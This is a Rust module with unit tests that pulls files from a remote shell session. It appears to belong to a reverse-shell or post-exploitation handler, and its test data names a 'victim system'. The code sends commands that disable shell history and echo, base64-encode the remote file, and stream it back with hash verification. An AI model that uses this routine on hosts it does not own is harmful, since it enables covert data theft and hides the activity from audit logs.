//! Download a remote file to the local filesystem (Linux/macOS).
//!
//! Protocol:
//!  1. Disable echo + history on the remote (one echoed line, unavoidable).
//!  2. Drain PTY feedback from that command.
//!  3. Send the main download command with per-download nonce delimiters so
//!     PTY echo of the command itself can never false-trigger the state machine.
//!  4. Stream base64, decode via carry-buffer state machine (handles TCP
//!     chunk boundaries for delimiters).
//!  5. SHA256 verify; restore echo + history on the remote.
//!  6. On any error, delete the partially-written local file.

use std::io::{self, Write as _};
use std::time::Duration;

use tokio::io::{AsyncRead, AsyncWrite, AsyncWriteExt};

use super::protocol::*;
use crate::cli::ShellType;

/// Download a remote file to the local filesystem.
pub async fn download<R, W>(
    reader: &mut R,
    writer: &mut W,
    remote_path: &str,
    local_path: &str,
    stdout: &mut io::Stdout,
    shell_type: ShellType,
) -> anyhow::Result<()>
where
    R: AsyncRead + Unpin,
    W: AsyncWrite + Unpin,
{
    if shell_type == ShellType::Windows {
        return super::windows::download_windows(reader, writer, remote_path, local_path, stdout).await;
    }

    let qpath = shell_quote(remote_path);
    let nonce = gen_nonce();

    // Per-download nonce delimiters.  Using printf 'SH%s%s\n' 'STRT' 'nonce' means
    // the literal "SHSTRT<nonce>" string never appears in the command text, so PTY
    // echo of the command cannot false-trigger the state machine.
    let ds: Vec<u8> = format!("SHSTRT{nonce}").into_bytes();
    let de: Vec<u8> = format!("SHEEND{nonce}").into_bytes();
    let dnf: Vec<u8> = format!("SHNF{nonce}").into_bytes();

    write!(stdout, "  \x1b[2m[↓]\x1b[0m  {} → {}   0 B\r", remote_path, local_path)?;
    stdout.flush()?;

    // Save history state and disable echo.  This one line IS echoed by the PTY
    // (unavoidable — echo fires before the command executes).
    // set +o history disables recording without clearing in-memory history.
    writer
        .write_all(
            b" _OHFP=\"$HISTFILE\"; set +o history; HISTFILE=/dev/null; stty -echo 2>/dev/null\n",
        )
        .await?;
    writer.flush().await?;
    tokio::time::sleep(Duration::from_millis(80)).await;

    // Drain PTY echo/feedback from the stty command before sending the real
    // download command so stale bytes don't confuse the state machine.
    drain_reader(reader, Duration::from_millis(30)).await;

    // Best-effort file-size probe — shows "recv / total  N%" in the progress bar.
    // stat -c%s (GNU/Linux) or stat -f%z (BSD/macOS); neither reads the file content.
    let sz_nonce = gen_nonce();
    let size_probe = format!(
        " stat -c%s {qpath} 2>/dev/null || stat -f%z {qpath} 2>/dev/null; echo 'SHSZ_{sz_nonce}'\n"
    );
    writer.write_all(size_probe.as_bytes()).await?;
    writer.flush().await?;
    let sz_resp = read_until_marker(reader, &format!("SHSZ_{sz_nonce}")).await?;
    let file_size: Option<u64> = sz_resp
        .lines()
        .filter_map(|l| l.trim().parse::<u64>().ok())
        .next();

    // Main download command — arrives silently (echo is now off).
    // Encoder fallback chain (most to least portable):
    //   1. python3 — always available on macOS; no line-wrap issues
    //   2. base64 -w0 — GNU coreutils (Linux)
    //   3. base64 — BSD/macOS (wraps at 76 chars, decoder strips whitespace)
    //   4. openssl base64 — last resort, wraps at 64 chars
    // if/else/fi avoids `exit 1` which would kill the remote bash session.
    let cmd = format!(
        "if test -r {qpath} 2>/dev/null; then \
         printf 'SH%s%s\\n' 'STRT' '{nonce}'; \
         python3 -c 'import base64,sys;sys.stdout.buffer.write(base64.b64encode(open(sys.argv[1],\"rb\").read()))' {qpath} 2>/dev/null \
         || base64 -w0 {qpath} 2>/dev/null \
         || base64 {qpath} 2>/dev/null \
         || openssl base64 -in {qpath} 2>/dev/null; \
         printf '\\nSH%s%s\\n' 'EEND' '{nonce}'; \
         else printf 'SH%s%s\\n' 'NF' '{nonce}'; fi\n"
    );
    writer.write_all(cmd.as_bytes()).await?;
    writer.flush().await?;

    // Create the destination file early to surface path errors before waiting
    // on the network.
    let mut local_file = tokio::fs::File::create(local_path)
        .await
        .map_err(|e| anyhow::anyhow!("cannot create {local_path}: {e}"))?;

    let result = recv_b64_to_file(
        reader, &mut local_file,
        &ds, &de, &dnf,
        file_size, remote_path, local_path, stdout,
    ).await;

    drop(local_file);

    let bytes_written = match result {
        Ok(n) => n,
        Err(e) => {
            let _ = tokio::fs::remove_file(local_path).await;
            return Err(e);
        }
    };

    write!(stdout, "\x1b[2K")?; // erase progress line
    stdout.flush()?;

    // SHA256 verification.  Echo is still OFF (restored at end of sha_cmd),
    // so `echo 'SHSHA_...:done'` cannot be echoed back and false-match.
    let sha_nonce = gen_nonce();
    // Use full paths for sha256sum/shasum so they work even with a stripped PATH.
    let sha_cmd = format!(
        "sha256sum {qpath} 2>/dev/null \
         || shasum -a 256 {qpath} 2>/dev/null \
         || /usr/bin/shasum -a 256 {qpath} 2>/dev/null \
         || python3 -c 'import hashlib,sys;print(hashlib.sha256(open(sys.argv[1],\"rb\").read()).hexdigest())' {qpath} 2>/dev/null; \
         echo 'SHSHA_{sha_nonce}:done'; \
         set -o history; HISTFILE=\"$_OHFP\"; unset _OHFP; stty echo 2>/dev/null\n"
    );
    writer.write_all(sha_cmd.as_bytes()).await?;
    writer.flush().await?;

    let sha_resp = read_until_marker(reader, &format!("SHSHA_{sha_nonce}:done")).await?;
    let remote_hash = parse_sha256_from_output(&sha_resp);
    let local_hash = sha256_local(local_path).await.ok();

    // If we received 0 bytes and cannot confirm the remote file is empty via
    // sha256 (e.g. sha256sum not in PATH on target), surface a clear diagnostic
    // so the operator knows the encoding step likely failed.
    if bytes_written == 0 {
        match (&local_hash, &remote_hash) {
            (Some(lh), Some(rh)) if lh == rh => {
                // Both hashes are the sha256 of an empty file — the remote file
                // genuinely is empty. Fall through to normal reporting.
            }
            (_, None) => {
                // Cannot verify — warn loudly instead of silently claiming success.
                write!(
                    stdout,
                    "  \x1b[1;33m[!]\x1b[0m  \x1b[2m[↓]\x1b[0m  0 B received — \
                     base64 encoder may be missing from PATH on target \
                     \x1b[2m(try: which python3 base64 openssl)\x1b[0m\r\n"
                )?;
                stdout.flush()?;
                let _ = tokio::fs::remove_file(local_path).await;
                return Err(anyhow::anyhow!(
                    "download produced 0 bytes; remote base64 encoder not found in PATH"
                ));
            }
            _ => {}
        }
    }

    print_transfer_result(
        stdout,
        "↓",
        remote_path,
        local_path,
        bytes_written,
        local_hash.as_deref(),
        remote_hash.as_deref(),
    )?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::util::base64_encode;
    use tokio::io::duplex;

    fn make_stdout() -> io::Stdout {
        io::stdout()
    }

    /// Read from `server` until the download command appears, responding to the
    /// size probe along the way, then return the per-download nonce.
    async fn read_download_nonce(server: &mut tokio::io::DuplexStream) -> String {
        let mut buf = vec![0u8; 65536];
        let mut acc = String::new();
        let mut sz_responded = false;
        loop {
            let n = server.read(&mut buf).await.unwrap_or(0);
            if n == 0 {
                break;
            }
            acc.push_str(&String::from_utf8_lossy(&buf[..n]));
            // Respond to the size probe (SHSZ_<8-char nonce>) once.
            if !sz_responded {
                if let Some(pos) = acc.find("SHSZ_") {
                    if acc.len() >= pos + 13 {
                        let sz_marker = format!("SHSZ_{}", &acc[pos + 5..pos + 13]);
                        let _ = server.write_all(format!("0\n{sz_marker}\n").as_bytes()).await;
                        sz_responded = true;
                    }
                }
            }
            // The download command contains `printf 'SH%s%s\n' 'STRT' '<nonce>'`
            if acc.contains("'STRT' '") {
                break;
            }
        }
        acc.find("'STRT' '")
            .map(|p| acc[p + 8..p + 16].to_string())
            .unwrap_or_else(|| "00000000".to_string())
    }

    /// Send a fake SHA256 response and handle the rest of the download protocol.
    async fn respond_sha256(server: &mut tokio::io::DuplexStream) {
        let mut buf = vec![0u8; 65536];
        let mut acc = String::new();
        loop {
            let n = server.read(&mut buf).await.unwrap_or(0);
            if n == 0 {
                break;
            }
            acc.push_str(&String::from_utf8_lossy(&buf[..n]));
            if acc.contains("SHSHA_") {
                if let Some(start) = acc.find("SHSHA_") {
                    let rest = &acc[start..];
                    let end = rest.find('\'').unwrap_or(rest.len());
                    let marker = &rest[..end];
                    let fake_hash = "aabbccdd".repeat(8); // 64 hex chars
                    let _ = server
                        .write_all(
                            format!("{fake_hash}  /remote/path\n{marker}:done\n").as_bytes(),
                        )
                        .await;
                }
                break;
            }
        }
    }

    #[tokio::test]
    async fn download_streams_to_disk_and_verifies() {
        let (client, mut server) = duplex(1 << 20);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        let content = b"hello from victim system";
        let b64 = base64_encode(content);

        tokio::spawn(async move {
            // Wait for the nonce-bearing download command.
            let nonce = read_download_nonce(&mut server).await;
            let resp = format!("SHSTRT{nonce}\n{b64}\nSHEEND{nonce}\n");
            server.write_all(resp.as_bytes()).await.unwrap();

            // Respond to the sha256sum command.
            respond_sha256(&mut server).await;
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let mut out = make_stdout();

        // SHA256 hashes will differ (fake vs real) — that's expected; the
        // important assertion is that the file content was written correctly.
        let _ = download(
            &mut client_r,
            &mut client_w,
            "/remote/path",
            tmp.path().to_str().unwrap(),
            &mut out,
            ShellType::Linux,
        )
        .await;

        let written = tokio::fs::read(tmp.path()).await.unwrap();
        assert_eq!(written, content);
    }

    #[tokio::test]
    async fn download_empty_file() {
        let (client, mut server) = duplex(65536);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        tokio::spawn(async move {
            let nonce = read_download_nonce(&mut server).await;
            // No data between start and end delimiters → empty file.
            server
                .write_all(format!("SHSTRT{nonce}SHEEND{nonce}\n").as_bytes())
                .await
                .unwrap();
            respond_sha256(&mut server).await;
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let mut out = make_stdout();
        download(
            &mut client_r,
            &mut client_w,
            "/remote/path",
            tmp.path().to_str().unwrap(),
            &mut out,
            ShellType::Linux,
        )
        .await
        .unwrap();

        let content = tokio::fs::read(tmp.path()).await.unwrap();
        assert_eq!(content, b"");
    }

    #[tokio::test]
    async fn download_file_not_found() {
        let (client, mut server) = duplex(65536);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        tokio::spawn(async move {
            let nonce = read_download_nonce(&mut server).await;
            // Simulate `test -r` failing — remote file doesn't exist.
            server
                .write_all(format!("SHNF{nonce}\n").as_bytes())
                .await
                .unwrap();
            // Server stays alive so the client can read the NOTFOUND marker.
            let mut buf = vec![0u8; 1024];
            let _ = server.read(&mut buf).await;
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let local = tmp.path().to_str().unwrap().to_string();
        let mut out = make_stdout();
        let result = download(&mut client_r, &mut client_w, "/no/such/file", &local, &mut out, ShellType::Linux).await;

        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("not found"), "error should mention not found: {msg}");

        // Partial local file must be cleaned up.
        assert!(
            !std::path::Path::new(&local).exists(),
            "partial file should be deleted on error"
        );
    }

    #[tokio::test]
    async fn download_cleans_up_partial_on_connection_drop() {
        let (client, mut server) = duplex(65536);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        tokio::spawn(async move {
            let nonce = read_download_nonce(&mut server).await;
            // Send start delimiter + some data, then drop the connection.
            let _ = server
                .write_all(format!("SHSTRT{nonce}aGVsbG8=\n").as_bytes())
                .await;
            // Dropping `server` closes the connection.
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let local = tmp.path().to_str().unwrap().to_string();
        let mut out = make_stdout();
        let result =
            download(&mut client_r, &mut client_w, "/remote/path", &local, &mut out, ShellType::Linux).await;

        assert!(result.is_err(), "download should fail when connection drops");

        // Partial local file must be deleted.
        assert!(
            !std::path::Path::new(&local).exists(),
            "partial file should be deleted when connection drops mid-transfer"
        );
    }

    #[tokio::test]
    async fn download_bsd_base64_line_wrapping() {
        // BSD base64 (macOS) wraps output at 60 characters per line.
        // Our whitespace-stripping decoder must handle this transparently.
        let (client, mut server) = duplex(1 << 20);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        let content: Vec<u8> = (0u8..=255).collect(); // 256 bytes
        // Build wrapped base64 as BSD would produce (60 chars/line).
        let b64_raw = base64_encode(&content);
        let wrapped: String = b64_raw
            .as_bytes()
            .chunks(60)
            .map(|c| std::str::from_utf8(c).unwrap())
            .collect::<Vec<_>>()
            .join("\n");

        tokio::spawn(async move {
            let nonce = read_download_nonce(&mut server).await;
            let resp = format!("SHSTRT{nonce}\n{wrapped}\nSHEEND{nonce}\n");
            server.write_all(resp.as_bytes()).await.unwrap();
            respond_sha256(&mut server).await;
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let mut out = make_stdout();
        let _ = download(
            &mut client_r,
            &mut client_w,
            "/remote/path",
            tmp.path().to_str().unwrap(),
            &mut out,
            ShellType::Linux,
        )
        .await;

        let written = tokio::fs::read(tmp.path()).await.unwrap();
        assert_eq!(written, content, "BSD line-wrapped base64 must decode correctly");
    }
}
